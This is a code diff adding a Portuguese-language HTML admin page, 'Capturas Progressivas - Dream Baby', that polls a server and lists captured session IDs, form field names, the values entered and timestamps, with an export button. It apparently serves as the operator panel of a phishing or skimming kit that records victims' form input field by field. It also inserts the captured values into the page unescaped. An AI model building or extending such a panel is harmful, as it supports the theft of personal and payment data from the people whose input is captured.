@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <title>Capturas Progressivas - Dream Baby</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
+    h1 { color: #333; }
+    .bloco {
+      background: #fff; padding: 12px 15px; margin-bottom: 10px;
+      border: 1px solid #ccc; border-radius: 6px;
+    }
+    button {
+      background-color: #4CAF50; color: white;
+      border: none; padding: 10px 15px; margin: 5px;
+      border-radius: 4px; cursor: pointer;
+    }
+    .acoes { margin-bottom: 20px; }
+    .label { font-weight: bold; color: #333; }
+  </style>
+</head>
+<body>
+  <h1>Capturas Progressivas</h1>
+
+  <div class="acoes">
+    <a href="/exportar-progressivo"><button>📁 Exportar Capturas</button></a>
+    <a href="/admin"><button>⬅️ Voltar para Painel Principal</button></a>
+    <button onclick="carregarCapturas()">🔄 Recarregar</button>
+  </div>
+
+  <div id="painel">Carregando dados...</div>
+
+  <script>
+    async function carregarCapturas() {
+      try {
+        const res = await fetch('/dados-progressivos');
+        const dados = await res.json();
+        const painel = document.getElementById('painel');
+        painel.innerHTML = '';
+
+        if (dados.length === 0) {
+          painel.innerHTML = '<p>Nenhum dado progressivo encontrado.</p>';
+          return;
+        }
+
+        dados.forEach((item, index) => {
+          painel.innerHTML += `
+            <div class="bloco">
+              <div class="label">Session ID:</div> ${item.sessionID}
+              <div class="label">Campo:</div> ${item.campo}
+              <div class="label">Valor:</div> ${item.valor}
+              <div class="label">Data:</div> ${new Date(item.dataEnvio).toLocaleString()}
+            </div>
+          `;
+        });
+      } catch (error) {
+        document.getElementById("painel").innerText = "Erro ao carregar dados.";
+      }
+    }
+
+    setInterval(carregarCapturas, 90000);
+    window.onload = carregarCapturas;
+  </script>
+</body>
+</html>
